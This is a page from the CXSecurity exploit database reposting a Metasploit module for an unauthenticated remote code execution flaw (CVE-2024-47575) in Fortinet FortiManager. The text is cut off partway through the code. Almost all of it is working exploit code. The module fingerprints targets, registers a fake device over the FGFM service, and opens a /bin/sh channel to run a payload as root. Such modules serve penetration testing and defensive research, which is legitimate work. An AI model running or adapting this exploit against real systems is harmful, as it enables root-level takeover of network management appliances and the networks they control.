---
title: Fortinet FortiManager Unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024120003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-04
fetch_date: 2025-10-06T19:36:56.764501
---

# Fortinet FortiManager Unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Fortinet FortiManager Unauthenticated Remote Code Execution** **2024.12.03**  Credit:  **[sfewer-r7](https://cxsecurity.com/author/sfewer-r7/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::Tcp
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Fortinet FortiManager Unauthenticated RCE',
'Description' => %q{
This module exploits a missing authentication vulnerability affecting FortiManager and FortiManager
Cloud devices to achieve unauthenticated RCE with root privileges.
The vulnerable FortiManager versions are:
\* 7.6.0
\* 7.4.0 through 7.4.4
\* 7.2.0 through 7.2.7
\* 7.0.0 through 7.0.12
\* 6.4.0 through 6.4.14
\* 6.2.0 through 6.2.12
The vulnerable FortiManager Cloud versions are:
\* 7.4.1 through 7.4.4
\* 7.2.1 through 7.2.7
\* 7.0.1 through 7.0.12
\* 6.4 (all versions).
},
'License' => MSF\_LICENSE,
'Author' => [
'sfewer-r7', # MSF Exploit & Rapid7 Analysis
],
'References' => [
['CVE', '2024-47575'],
# AttackerKB Rapid7 Analysis.
['URL', 'https://attackerkb.com/topics/OFBGprmpIE/cve-2024-47575/rapid7-analysis'],
# Bishop Fox details certificate requirements for connecting to the FGFM service.
['URL', 'https://bishopfox.com/blog/a-look-at-fortijump-cve-2024-47575'],
# Vendor Advisory.
['URL', 'https://fortiguard.fortinet.com/psirt/FG-IR-24-423']
],
'DisclosureDate' => '2024-10-23',
'Platform' => %w[unix linux],
'Arch' => [ARCH\_CMD],
'Privileged' => true, # Code execution as 'root'
'DefaultOptions' => {
'RPORT' => 541,
'SSL' => true,
'FETCH\_WRITABLE\_DIR' => '/tmp'
},
'Targets' => [ [ 'Default', {} ] ],
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS]
}
)
)
register\_options(
[
# The exploit provides a suitable client certificate/key pair by default, however we can let a user configure
# a different certificate/key pair to use if they want. The user can also override the serial number and
# platform if needed, but the exploit will try to detect the serial number and platform from the certificate
# by default.
OptPath.new('ClientCert', [false, 'A file path to an x509 cert, signed by Fortinet, with a serial number in the CN']),
OptPath.new('ClientKey', [false, 'A file path to the corresponding private key for the ClientCert.']),
OptString.new('ClientSerialNumber', [false, 'If set, use this serial number instead of extracting one from the ClientCert.']),
OptString.new('ClientPlatform', [false, 'If set, use this platform instead of determining the platform at runtime.'])
]
)
end
def check
fgfm\_sock = make\_socket
peer\_cert = OpenSSL::X509::Certificate.new(fgfm\_sock.peer\_cert)
fgfm\_sock.close
organization = get\_cert\_subject\_item(peer\_cert, 'O')
common\_name = get\_cert\_subject\_item(peer\_cert, 'CN')
# Detect that the target is a Fortinet FortiManager, by inspecting the certificate the server is using.
# We look for an organization (O) of 'Fortinet', and a common name (CN) that starts with a FortiManager serial
# number identifier.
return CheckCode::Detected('Detected Fortinet FortiManager') if organization == 'Fortinet' && common\_name&.start\_with?('FMG')
CheckCode::Unknown
end
def exploit
client\_cert\_raw = datastore['ClientCert'] ? File.binread(datastore['ClientCert']) : get\_client\_cert
client\_cert = OpenSSL::X509::Certificate.new(client\_cert\_raw)
common\_name = get\_cert\_subject\_item(client\_cert, 'CN')
fail\_with(Failure::BadConfig, 'No common name in client certificate subject') unless common\_name
print\_status("Client certificate common name: #{common\_name}")
serial\_number = 'FMG-VM0000000000'
platform = 'FortiManager-VM64'
# The platform needs to be the expected type of the corresponding serial number. We try to match these up here,
# and we allow for the automatic detection to be overridden by the ClientSerialNumber and ClientPlatform options
# in case it is needed.
if common\_name.start\_with? 'FMG'
serial\_number = common\_name
platform = 'FortiManager-VM64'
elsif common\_name.start\_with? 'FG'
serial\_number = common\_name
platform = 'FortiGate-VM64'
else
print\_warning('Client certificate does not include a serial number in the common name. The target must be configured to accept a certificate like this.')
end
serial\_number = datastore['ClientSerialNumber'] if datastore['ClientSerialNumber']
platform = datastore['ClientPlatform'] if datastore['ClientPlatform']
print\_status("Using client serial number '#{serial\_number}' and platform '#{platform}'.")
print\_status('Connecting...')
fgfm\_sock = make\_socket
fail\_with(Failure::UnexpectedReply, 'Connection failed.') unless fgfm\_sock
print\_status('Registering device...')
req1 = "get auth\r\nserialno=#{serial\_number}\r\nplatform=#{platform}\r\nhostname=localhost\r\n\r\n\x00"
resp1 = send\_packet(fgfm\_sock, req1)
unless resp1&.include?('reply 200')
fail\_with(Failure::UnexpectedReply, 'Request 1 failed: No reply 200.')
end
print\_status('Creating channel...')
req2 = "get connect\_tcp\r\ntcp\_port=rsh\r\nchan\_window\_sz=#{32 \* 1024}\r\nterminal=1\r\ncmd=/bin/sh\r\nlocalid=0\r\n\r\n\x00"
resp2 = send\_packet(fgfm\_sock, req2)
unless resp2&.include?('action=ack')
fail\_with(Failure::UnexpectedReply, 'Request 2 failed: No ack.')
end
localid = resp2.match(/localid=(\d+)/)
unless localid
fail\_with(Failure::UnexpectedReply, 'Request 2 failed: No localid found.')
end
print\_status('Triggering...')
req3 = "channel\r\nremoteid=#{localid[1]}\r\n\r\n\x00" + payload.encoded.length.to\_s + "\n" + payload.encoded + "0\n"
send\_packet(fgfm\_sock, req3, read: false)
end
# We create a TCP socket like this as we want to control how we specify the client certificate/key pair, which may
# either be a file path, or a blob of text.
def make\_socket
hash = {
'Proto' => 'tcp',
'PeerHost' => datastore['RHOST'],
'PeerPort' => datastore['RPORT...